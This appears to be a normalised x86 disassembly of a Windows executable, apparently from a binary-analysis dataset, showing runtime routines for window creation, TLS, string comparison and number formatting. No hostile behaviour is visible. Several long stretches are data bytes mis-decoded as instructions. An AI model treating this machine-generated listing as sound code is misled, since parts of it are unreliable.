lea eax [ ebp - 0x10 ]
lea edx [ ebp - 0xb ]
mov ecx 0x7
call sub_404258
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x4 ]
call sub_402ca4
mov ebx eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405e31
lea eax [ ebp - 0x10 ]
call sub_403fe8
retn
xor ebx ebx
sub_405e38
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_405e82
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405e89
retn
mov eax rw-data
call sub_402b1c
mov eax rw-data
call sub_402b1c
mov eax rw-data
call sub_402b1c
call sub_401af8
sub_405e8c
sub [ rw-data ] 0x1
jae r-xdata
retn
mov [ rw-data ] 0x2
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] 0x2
mov [ rw-data ] sub_404dd8
call sub_4030b0
test al al
je r-xdata
call sub_4031a4
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
call GetCommandLineA
mov [ rw-data ] eax
call sub_401344
mov [ rw-data ] eax
call sub_40133c
and eax 0x80000000
cmp eax 0x80000000
je r-xdata
call sub_4030e0
call sub_4012b4
call sub_405dc4
mov [ rw-data ] eax
call sub_40133c
and eax 0xff
cmp ax 0x4
jbe r-xdata
call sub_4012b4
call sub_405dc4
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] 0x3
jmp r-xdata
call sub_401334
mov [ rw-data ] eax
sub_405f94
push ebx
call sub_405f8c
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov eax ebx
call sub_405f80
test eax eax
jne r-xdata
mov eax 0xe2
call sub_403fdc
push eax
mov eax [ rw-data ]
push eax
call TlsSetValue
mov eax 0xe2
call sub_403fdc
sub_405fd8
mov cl [ rw-data ]
mov eax [ rw-data ]
test cl cl
jne r-xdata
push eax
call TlsGetValue
test eax eax
je r-xdata
mov edx [ fs : 0x2c ]
mov eax [ edx + eax * 4 ]
retn
call sub_405f94
mov eax [ rw-data ]
push eax
call TlsGetValue
test eax eax
je r-xdata
retn
mov eax [ rw-data ]
retn
retn
sub_406024
push ebx
mov ebx eax
xor eax eax
mov [ rw-data ] eax
push 0x0
call sub_405f60
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
call sub_406018
mov edx rw-data
mov eax ebx
call sub_403d30
pop ebx
retn
sub_406068
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40608d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406094
retn
sub_4060dc
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
add ecx eax
mov [ ebx + 0x8 ] ecx
add edx [ ebp + 0xc ]
mov [ ebx + 0xc ] edx
pop ebx
pop ebp
retn 0x8
sub_4060f8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40611d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406124
retn
sub_406130
xor al 0x61
inc eax
add [ ebx ] al
add ch [ esi ]
xor [ 0x0 ] eax
or al 0x0
add [ eax ] al
xor [ ecx + 0x40 ] ah
add [ edx ] cl
outsd
push ebx
insb
arpl [ gs : ebp + 0x64 ] si
or [ edi + 0x64 ] ch
inc edi
jb r-xdata
jb r-xdata
jns r-xdata
retn
xor [ fs : ebx ] ecx
outsd
push edx
jae r-xdata
or ch [ fs : edi + 0x64 ]
inc esp
imul esi [ ebx + 0x61 ] 0x64656c62
or [ edi + 0x64 ] ebp
inc ebx
push 0x656b6365
or [ fs : edi + 0x64 ] ebp
inc esi
outsd
arpl [ ebp + 0x73 ] si
or [ fs : edi + 0x64 ] ebp
inc esp
popa
jne r-xdata
inc edi
add [ ebx + 0x7425ffc0 ] cl
jb r-xdata
jb r-xdata
je r-xdata
sar bh 0x25
insb
retn
xor cl [ fs : esi ]
outsd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
inc edi
add [ ebx + 0x6025ffc0 ] cl
retn
ja EnterCriticalSection
or ch [ edi + 0x64 ]
outsd
dec eax
outsd
je r-xdata
add [ ebx + 0x7c25ffc0 ] cl
retn
imul esi [ fs : edi + eax + 0x57 ] 0x6f646e69
je FindResourceA
ja r-xdata
imul esi [ edi + eax + 0x57 ] 0x6f646e69
dec ecx
outsb
popad
arpl [ ecx + ebp * 2 + 0x76 ] si
or [ gs : edi + 0x64 ] ebp
dec esi
outsd
inc ecx
arpl [ ebx + 0x65 ] sp
insb
or eax 0x6f4e646f
inc esi
outsd
arpl [ ebp + 0x73 ] si
push edx
arpl [ gs : ebx + ecx + 0x6f ] si
push edx
jae CompareStringA
imul esp [ edi + 0x68 ] 0x646f0a74
mov eax eax
nop
in al 0x61
inc eax
add [ esi ] al
andps xmm1 [ edi + 0x77 ]
outsb
jb r-xdata
je r-xdata
add [ ebx + 0x7025ffc0 ] cl
retn
mov eax eax
add esi [ eax ]
popad
inc eax
add [ ebx + 0x6c25ffc0 ] cl
retn 0x47
sub_406c34
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
call sub_402a98
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
call CreateWindowExA
mov esi eax
mov eax ebx
call sub_402a88
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x24
sub_406c8c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
call sub_402a98
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
push 0x0
call CreateWindowExA
mov esi eax
mov eax ebx
call sub_402a88
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x20
sub_406ce4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
push r-xdata
push r-xdata
call FindWindowA
mov ebx eax
push r-xdata
call RegisterWindowMessageA
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
push r-xdata
call RegisterWindowMessageA
mov [ esi ] eax
push r-xdata
call RegisterWindowMessageA
mov [ edi ] eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
xor edx edx
mov [ eax ] edx
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x3
test ebx ebx
je r-xdata
push 0x0
push 0x0
mov eax [ esi ]
push eax
push ebx
call SendMessageA
mov edx [ ebp + 0xc ]
mov [ edx ] eax
jmp r-xdata
push 0x0
push 0x0
mov eax [ edi ]
push eax
push ebx
call SendMessageA
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
cmp [ edi ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_406dd9
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_406e01
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406e08
retn
sub_406e14
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_406e39
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406e40
retn
sub_406e4c
push 0xf00047b6
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add cl dh
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add dl dh
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add bl dh
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add ah dh
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add ch dh
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add dh dh
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add bh dh
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add al bh
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add cl bh
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add dl bh
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add bl bh
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add ah bh
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add ch bh
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add dh bh
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add bh bh
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add al ah
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add cl ah
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add dl ah
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add bl ah
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add ah ah
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add ch ah
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add dh ah
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add bh ah
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add al ch
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add cl ch
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add dl ch
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add bl ch
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add ah ch
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add ch ch
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add dh ch
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add bh ch
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add al dl
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add cl dl
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add dl dl
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add bl dl
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add ah dl
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add ch dl
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add dh dl
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add bh dl
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add al bl
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add cl bl
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add dl bl
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add bl bl
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add ah bl
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add ch bl
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add dh bl
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add bh bl
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add al al
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add cl al
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add dl al
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add bl al
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add ah al
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add ch al
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add dh al
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add bh al
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add al cl
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add cl cl
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add dl cl
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add bl cl
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add ah cl
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add ch cl
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add dh cl
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add bh cl
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ eax + 0x680000ff ] dh
mov dh 0x47
add [ ecx + 0x680000ff ] dh
mov dh 0x47
add [ edx + 0x680000ff ] dh
mov dh 0x47
add [ ebx + 0x680000ff ] dh
mov dh 0x47
add [ edi + edi * 8 - 0x49980000 ] dh
inc edi
add [ ebp + 0x680000ff ] dh
mov dh 0x47
add [ esi + 0x680000ff ] dh
mov dh 0x47
add [ edi + 0x680000ff ] dh
mov dh 0x47
add [ eax + 0x680000ff ] bh
mov dh 0x47
add [ ecx + 0x680000ff ] bh
mov dh 0x47
add [ edx + 0x680000ff ] bh
mov dh 0x47
add [ ebx + 0x680000ff ] bh
mov dh 0x47
add [ edi + edi * 8 - 0x49980000 ] bh
inc edi
add [ ebp + 0x680000ff ] bh
mov dh 0x47
add [ esi + 0x680000ff ] bh
mov dh 0x47
add [ edi + 0x680000ff ] bh
mov dh 0x47
add [ eax + 0x680000ff ] ah
mov dh 0x47
add [ ecx + 0x680000ff ] ah
mov dh 0x47
add [ edx + 0x680000ff ] ah
mov dh 0x47
add [ ebx + 0x680000ff ] ah
mov dh 0x47
add [ edi + edi * 8 - 0x49980000 ] ah
inc edi
add [ ebp + 0x680000ff ] ah
mov dh 0x47
add [ esi + 0x680000ff ] ah
mov dh 0x47
add [ edi + 0x680000ff ] ah
mov dh 0x47
add [ eax + 0x680000ff ] ch
mov dh 0x47
add [ ecx + 0x680000ff ] ch
mov dh 0x47
add [ edx + 0x680000ff ] ch
mov dh 0x47
add [ ebx + 0x550000ff ] ch
mov ebp esp
xor eax eax
push ebp
push sub_407151
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_407158
retn
sub_407c50
xor [ eax + eax * 2 ] edi
cmp edi [ eax + eax * 2 ]
inc ebp
jl r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] dl
jl r-xdata
je r-xdata
add [ eax ] dh
add [ eax ] al
add ah cl
adc [ eax ] eax
mov al [ 0x28004034 ]
pop ecx
inc eax
add [ ecx + ebx * 2 ] dh
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add [ ecx + ebx * 2 + 0x40 ] al
add [ edx + esi ] ah
inc eax
add [ eax ] al
add [ eax ] al
add [ ecx ] bl
jl r-xdata
push ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] ah
jl r-xdata
xor al 0x31
inc edi
add [ ebx + 0x34158910 ] cl
xor [ edi ] eax
mov edx [ rw-data ]
mov ecx [ eax + 0x4 ]
mov [ edx ] ecx
arpl [ eax + 0x72 ] bp
outsd
test eax 0xf08bffff
mov eax esi
xor ecx ecx
mov edx ebx
call sub_402c84
mov eax esi
pop esi
pop ebx
push edx
popad
inc ebp
js r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] ch
jl r-xdata
insb
jne r-xdata
add al bl
jl r-xdata
add [ ecx ] al
add [ eax ] al
add [ edx - 0x74 ] dl
adc [ ebx - 0x71 ] bh
sbb eax 0xdf9c4cdb
push edi
loopne r-xdata
retn
jns r-xdata
imul esi [ esi + 0x65 ] 0x74697257
push ebx
imul esi [ ebp + 0x53 ] 0x68636e79
jb r-xdata
sbb [ 0x407c503f ] edi
add [ eax + eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
fdivr [ eax + eax * 2 ]
insb
jl r-xdata
mov ebx [ eax + 0x8 ]
mov edx 0xc
call sub_402714
call ebx
pop ebx
retn
adc [ ecx + 0x47313415 ] cl
add [ ebx + 0x47a1d815 ] cl
add [ ebx + 0xa890448 ] cl
outsb
imul edi [ edx + 0x65 ] r-xdata
add [ ebp + ecx * 8 + 0x40 ] al
add [ esp + edx * 2 ] ah
dec ebp
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_407d00
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx eax
shr edx 0x10
div bx
mov ebx [ ebp + 0x8 ]
mov [ ecx ] ax
mov [ ebx ] dx
pop ebx
pop ebp
retn 0x4
sub_407d1c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b760
call sub_403a24
pop edi
pop esi
pop ebx
retn
sub_407d40
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4026f4
mov esi eax
mov eax esi
xor ecx ecx
mov edx ebx
call sub_402c84
mov eax esi
pop esi
pop ebx
retn
sub_407d60
push ebx
mov eax [ rw-data ]
mov edx [ eax ]
mov [ rw-data ] edx
mov edx [ rw-data ]
mov ecx [ eax + 0x4 ]
mov [ edx ] ecx
mov ebx [ eax + 0x8 ]
mov edx 0xc
call sub_402714
call ebx
pop ebx
retn
sub_407d8c
push ebx
mov ebx eax
mov eax 0xc
call sub_4026f4
mov edx [ rw-data ]
mov [ eax ] edx
mov edx [ rw-data ]
mov edx [ edx ]
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ebx
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] sub_407d60
pop ebx
retn
sub_407dc4
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4042a8
mov ebx eax
mov eax edi
mov edx ebx
call sub_404634
mov edx esi
mov esi [ edi ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al [ edx ]
cmp al 0x61
jb r-xdata
mov [ esi ] al
inc edx
inc esi
dec ebx
test ebx ebx
jne r-xdata
cmp al 0x7a
ja r-xdata
sub al 0x20
sub_407e00
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4042a8
mov ebx eax
mov eax edi
mov edx ebx
call sub_404634
mov edx esi
mov esi [ edi ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al [ edx ]
cmp al 0x41
jb r-xdata
mov [ esi ] al
inc edx
inc esi
dec ebx
test ebx ebx
jne r-xdata
cmp al 0x5a
ja r-xdata
add al 0x20
sub_407e3c
push esi
push edi
mov esi eax
mov edi edx
or eax eax
je r-xdata
or edx edx
je r-xdata
mov eax [ eax - 0x4 ]
mov ecx eax
cmp ecx edx
jbe r-xdata
mov edx [ edx - 0x4 ]
cmp ecx ecx
[ esi ] [ edi ]
je r-xdata
mov ecx edx
sub eax edx
pop edi
pop esi
retn
movzx eax [ esi - 0x1 ]
movzx edx [ edi - 0x1 ]
sub_407e6c
push esi
push edi
mov esi eax
mov edi edx
mov edx ecx
xor eax eax
and edx 0x3
sar ecx 0x2
js r-xdata
inc eax
[ esi ] [ edi ]
jne r-xdata
pop edi
pop esi
retn
mov ecx edx
[ esi ] [ edi ]
jne r-xdata
sub_407e8c
push esi
push edi
push ebx
mov esi eax
mov edi edx
or eax eax
je r-xdata
or edx edx
je r-xdata
mov eax [ eax - 0x4 ]
mov ecx eax
cmp ecx edx
jbe r-xdata
mov edx [ edx - 0x4 ]
cmp ecx ecx
mov ecx edx
sub eax edx
pop ebx
pop edi
pop esi
retn
mov bl [ esi - 0x1 ]
cmp bl 0x61
jb r-xdata
mov bh [ edi - 0x1 ]
cmp bh 0x61
jb r-xdata
cmp bl 0x7a
ja r-xdata
cmp bl bh
je r-xdata
cmp bh 0x7a
ja r-xdata
sub bl 0x20
[ esi ] [ edi ]
je r-xdata
movzx eax bl
movzx edx bh
sub bh 0x20
sub_407ee0
cmp eax edx
je r-xdata
mov al 0x1
or eax eax
je r-xdata
retn
or edx edx
je r-xdata
xor eax eax
retn
mov ecx [ eax - 0x4 ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
call sub_407e8c
test eax eax
jne r-xdata
sub_407f04
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4042a8
push eax
mov eax esi
call sub_4044a8
push eax
mov eax ebx
call sub_4042a8
push eax
mov eax ebx
call sub_4044a8
push eax
push 0x0
push 0x400
call CompareStringA
sub eax 0x2
pop esi
pop ebx
retn
sub_407f3c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4042a8
push eax
mov eax esi
call sub_4044a8
push eax
mov eax ebx
call sub_4042a8
push eax
mov eax ebx
call sub_4044a8
push eax
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop esi
pop ebx
retn
sub_407f8c
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
push ebx
push edi
push ebx
push esi
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop edi
pop esi
pop ebx
retn
sub_407fac
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
call sub_4042a8
mov esi eax
mov ebx 0x1
jmp r-xdata
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
cmp [ edi + ebx - 0x1 ] 0x20
jbe r-xdata
cmp [ edi + esi - 0x1 ] 0x20
jbe r-xdata
mov eax ebp
call sub_403fe8
jmp r-xdata
inc ebx
dec esi
push ebp
mov ecx esi
sub ecx ebx
inc ecx
mov edx ebx
mov eax edi
call sub_404508
pop ebp
pop edi
pop esi
pop ebx
retn
sub_407ffc
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov eax esi
call sub_4042a8
test eax eax
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov al [ esi ]
add al 0xbf
sub al 0x1a
jb r-xdata
mov eax esi
call sub_4042a8
sub eax 0x2
jl r-xdata
sub al 0x4
je r-xdata
mov bl 0x1
inc eax
mov edi 0x2
add al 0xfe
sub al 0x1a
jae r-xdata
inc edi
dec eax
jne r-xdata
add dl 0xf9
sub dl 0x1a
jb r-xdata
mov dl [ esi + edi - 0x1 ]
add dl 0xd0
sub dl 0xa
jb r-xdata
sub dl 0x4
je r-xdata
add dl 0xfe
sub dl 0x1a
jae r-xdata
sub_408060
or cl cl
jne r-xdata
push edx
push esi
or eax eax
jns sub_408076
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
neg eax
call sub_408076
mov al 0x2d
inc ecx
dec esi
mov [ esi ] al
retn
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_408076
mov ecx 0xa
push edx
push esi
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_4080ac
push esi
mov esi esp
sub esp 0x10
xor ecx ecx
push edx
xor edx edx
call sub_408060
mov edx esi
pop eax
call sub_4040d8
add esp 0x10
pop esi
retn
sub_4080cc
or cl cl
jne sub_408100
mov ecx 0xa
test [ eax + 0x4 ] 0x80000000
je sub_408100
push [ eax + 0x4 ]
push [ eax ]
mov eax esp
neg [ esp ]
adc [ esp + 0x4 ] 0x0
neg [ esp + 0x4 ]
call sub_408100
mov [ esi - 0x1 ] 0x2d
dec esi
inc ecx
add esp 0x8
retn
sub_408100
push esi
sub esp 0x4
fnstcw [ esp + 0x2 ]
fnstcw [ esp ]
or [ esp ] 0xf00
fldcw [ esp ]
mov [ esp ] cx
fld1
test [ eax + 0x4 ] 0x80000000
je r-xdata
fild [ eax ]
push [ eax + 0x4 ]
push [ eax ]
and [ esp + 0x4 ] 0x7fffffff
push 0x7fffffff
push 0xffffffff
fild [ esp + 0x8 ]
fild [ esp ]
fadd st2
faddp st1
add esp 0x10
jmp r-xdata
mov [ esi ] al
fld st1
fcom st3
fwait
fnstsw ax
sahf
jae r-xdata
add al 0x7
fild [ esp ]
fld st1
dec esi
fprem
fistp [ esp ]
fdiv st1
mov al [ esp ]
add al 0x30
cmp al 0x3a
jb r-xdata
fldcw [ esp + 0x2 ]
add esp 0x4
ffree st3
ffree st2
ffree st1
ffree st0
pop ecx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
sub esi edx
mov al 0x30
add ecx edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_408198
push ebp
mov ebp esp
push esi
mov esi esp
sub esp 0x20
xor ecx ecx
push eax
xor edx edx
lea eax [ ebp + 0x8 ]
call sub_4080cc
mov edx esi
pop eax
call sub_4040d8
add esp 0x20
pop esi
pop ebp
retn 0x8
sub_4081c0
cmp edx 0x20
jbe r-xdata
push esi
mov esi esp
sub esp 0x20
push ecx
mov ecx 0x10
call sub_408060
mov edx esi
pop eax
call sub_4040d8
add esp 0x20
pop esi
retn
xor edx edx
sub_4081e8
push ebx
push esi
add esp 0xfffffff4
mov ebx eax
mov edx esp
mov eax ebx
call sub_402ca4
mov esi eax
cmp [ esp ] 0x0
je r-xdata
mov eax esi
add esp 0xc
pop esi
pop ebx
retn
mov [ esp + 0x4 ] ebx
mov [ esp + 0x8 ] 0xb
lea edx [ esp + 0x4 ]
mov eax [ rw-data ]
xor ecx ecx
call sub_407d1c
sub_40823c
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_402ca4
mov [ esi ] eax
cmp [ esp ] 0x0
sete al
pop edx
pop esi
pop ebx
retn
sub_40825c
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_404e04
mov [ esi ] eax
mov [ esi + 0x4 ] edx
cmp [ esp ] 0x0
sete al
pop edx
pop esi
pop ebx
retn
sub_40827c
mov eax [ rw-data ]
call sub_405034
test eax eax
jne r-xdata
mov eax [ rw-data ]
call sub_405034
test eax eax
jne r-xdata
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_4051f0
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_40403c
retn
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_4051f0
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_40403c
sub_40830c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x0
mov esi edx
test esi esi
jl r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
mov ebx eax
add ebx 0x4
dec esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebx ]
call sub_407f74
test al al
je r-xdata
sub_408348
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_409534
mov edx eax
test dl dl
je r-xdata
call sub_40827c
push ebp
mov eax [ rw-data ]
call sub_40503c
mov edx eax
mov eax [ rw-data ]
call sub_40830c
pop ecx
mov edx eax
test dl dl
je r-xdata
fld [ ebp - 0x10 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ ebx ]
jmp r-xdata
push ebp
mov eax [ rw-data ]
call sub_40503c
mov edx eax
mov eax [ rw-data ]
call sub_40830c
pop ecx
mov edx eax
test dl dl
je r-xdata
mov [ ebx ] 0x1
jmp r-xdata
mov eax edx
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebx ] 0x0
sub_4083e4
push ebx
push esi
mov esi ecx
mov ebx eax
test dl dl
je r-xdata
mov eax esi
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_40403c
call sub_40827c
test bl bl
je r-xdata
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_40403c
pop esi
pop ebx
retn
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_40403c
jmp r-xdata
pop esi
pop ebx
retn
sub_408430
push ebx
push esi
push edi
mov ebx edx
mov edi eax
or eax 0xffffffff
mov esi ebx
and esi 0x3
cmp esi 0x2
ja r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
and edx 0xf0
cmp edx 0x40
ja r-xdata
push 0x0
push 0x80
push 0x3
push 0x0
mov eax ebx
and eax 0xf0
shr eax 0x4
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi * 4 + rw-data ]
push eax
mov eax edi
call sub_4044a8
push eax
